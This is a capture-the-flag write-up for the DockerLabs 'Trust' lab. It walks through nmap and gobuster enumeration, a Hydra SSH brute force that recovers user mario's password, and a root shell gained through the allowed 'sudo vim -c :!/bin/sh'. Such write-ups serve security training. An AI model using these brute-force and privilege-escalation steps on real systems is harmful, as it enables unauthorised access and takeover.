#Trust DockerLabs - 13/05/2024

#web - https://dockerlabs.es/#/

We start by performing a basic scan with nmap.

```shell
└─$ nmap -sV -sC -n -p- --min-rate 5000 172.17.0.2                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 22:22 CEST
Nmap scan report for 172.17.0.2
Host is up (0.00023s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds

```

Here we find a port 22 and a port 80, I enter the web address ‘http://172.17.0.2/’ and I can see that it is an apache page:

![Captura de pantalla 2024-05-13 224854](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/44dee495-8746-4af4-94f8-e41c76ea6cf1)

We search for subdomains with gobuster: 

```shell
└─$ gobuster dir -u "http://172.17.0.2/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,php.bak,php,txt,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 813927 / 1323366 (61.50%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 818325 / 1323366 (61.84%)
===============================================================
Finished
===============================================================
                                                                 
```

We found a .php file called ‘secret.php’. I access this file and I see a page where it talks about a user ‘mario’:

![Captura de pantalla 2024-05-13 225146](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/5b429c97-e09e-4c60-b278-b66b21533728)

We do a brute force attack with hydra on the ssh server with the user mario:

```shell
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-13 22:36:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-13 22:36:26           
```

It finds us a password for the user mario, we try it and we see that it lets us in:

```shell
└─$ ssh mario@172.17.0.2               
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mario@172.17.0.2's password: 
Linux eb21e3cbaf4b 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21

```

```shell
mario@eb21e3cbaf4b:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on eb21e3cbaf4b:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on eb21e3cbaf4b:
    (ALL) /usr/bin/vim

```

We see that we can run root without a password so we proceed to privilege escalation.
We enter ‘https://gtfobins.github.io/#’ a website dedicated to the exploitation of these bins among other things:
Search for ‘vim’ and enter ‘sudo’:

![Captura de pantalla 2024-05-13 225938](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/9064fe61-5dda-4bf0-b772-66125e1afe4e)

![Captura de pantalla 2024-05-13 225938](https://github.com/AnonimPlayerr/DockerLabsWriteUps/assets/146385424/9064fe61-5dda-4bf0-b772-66125e1afe4e)

We execute the command and we see that we are now root:

```shell
mario@eb21e3cbaf4b:~$ sudo vim -c ':!/bin/sh'

```

```shell
# whoami
root

```
